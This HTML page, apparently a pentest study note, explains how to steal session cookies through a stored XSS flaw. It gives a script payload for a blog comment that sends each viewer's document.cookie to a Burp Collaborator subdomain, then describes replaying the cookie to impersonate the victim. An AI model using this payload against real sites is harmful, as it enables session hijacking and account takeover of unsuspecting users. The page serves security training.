<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>2. Steal Cookies (with Burp Collaborator)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>2. Steal Cookies (with Burp Collaborator)</h1><br/><br />We can exploit XSS vulnerabilities to send the victim&#39;s cookies to our own domain(or Burp Collaborator), then manually inject the cookies into your browser and impersonate the victim.<br /><br /><strong>Limitations of this exploit</strong><br />• The victim might not be logged in.<br />• Many applications hide their cookies from JavaScript using the <code>HttpOnly</code> flag.<br />   ◇ <a href="https://owasp.org/www-community/HttpOnly">https://owasp.org/www-community/HttpOnly</a><br />   ◇ chapter about <a href="--WebApp_Pentest--web_application_basics--HTTP_&_HTTPS_protocol--Tokens_to_mantain_a_session_state--Cookies_(Set-Cookie_&_Cookie_headers).html">Cookies</a><br />• Sessions might be locked to additional factors like the user&#39;s IP address.<br />• The session might time out before you&#39;re able to hijack it.<br /><br /><br /><br />1.Burp Professional → Burp → Burp Collaborator client<br />    <a href=""><img src="images/1913-1.png" alt="images/1913-1.png" /></a><br /><br />2. &quot;Copy to clipboard&quot;, this will generate a Burp Collaborator subdomain that we can monitor<br />    <a href=""><img src="images/1913-2.png" alt="images/1913-2.png" /></a><br /><br /><br />2. <h6>Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated</h6>.<br />    This script will make anyone who views the comment issue a POST request to burpcollaborator.net containing their cookie<br />    <div class="codebox"><pre>&lt;script&gt;<br />fetch(<span style="color:#3ad900;font-weight:400">&#39;https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;</span>, {<br />method: <span style="color:#3ad900;font-weight:400">&#39;POST&#39;</span>,<br />mode: <span style="color:#3ad900;font-weight:400">&#39;no-cors&#39;</span>,<br />body<span style="color:#ff0044;font-weight:400">:document</span>.cookie<br />});<br />&lt;/script&gt;</pre></div><br />    <a href=""><img src="images/1913-3.png" alt="images/1913-3.png" /></a><br />    <br />    <br />3. Go back to the Burp Collaborator client window now we need only to wait that a user connect to the webpage so  we can steal his cookie!<br />    When we will see an HTTP interaction mans that a user has requested the webpage.    <br />    <a href=""><img src="images/1913-4.png" alt="images/1913-4.png" /></a><br />    <br />    <br />    <br />4. Take a note of the value of the victim&#39;s session cookie<br />    Reload a page of the website, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator.<br />    <a href=""><img src="images/1913-5.png" alt="images/1913-5.png" /></a><br /><br /></div>
</body>
</html>
